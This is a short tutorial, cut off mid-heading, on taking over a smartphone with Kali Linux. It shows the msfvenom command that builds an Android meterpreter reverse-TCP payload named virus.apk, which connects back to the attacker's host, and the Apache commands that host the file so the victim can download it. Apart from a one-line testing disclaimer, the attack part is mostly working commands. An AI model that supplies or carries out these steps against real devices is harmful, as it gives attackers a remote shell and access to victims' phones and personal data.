# How to hack a smarphone with Kali Linux (complete guide)
Kali linux is an OS that is focused on pentesting and ethical hacking. It if totally free and open source. In this guide you will see how you can test to gain acces to a phone with some pentesting tools. ONLY USE THIS FOR TESTING PURPOSES. 

**More info at https://www.kali.org/**

## Creating the maliciuos file
The first thing that we need to make, is to create a malicious file with the correct parameters as for making a connection between our computer and the affected device.
#### `msfvenom -p android/meterpreter/reverse_tcp LHOST=(ENTER YOUR IP ADRESS WITHOUT THE BRACKETS) LPORT=8080  R> virus.apk`

## Two options to proceed
1) Making the virus aviable online.
2) Infecting the virus via cable.


## Option 1)Uploading the file to an apache server.
This method consists in uploading the file to a server that is hosted by the linux machine. You can make shure if it is running by entering this command.

```sudo service apache2 status```

**If you see as an output that it is offline, then turn it on with the following command.**

```sudo service apache2 start```

### Copying the files to the apache online server
Now, we need to copy the malicoius file to the apache directory, in order for making it accesible on the internet.

```scp virus.apk /var/www/html/```

### Ch


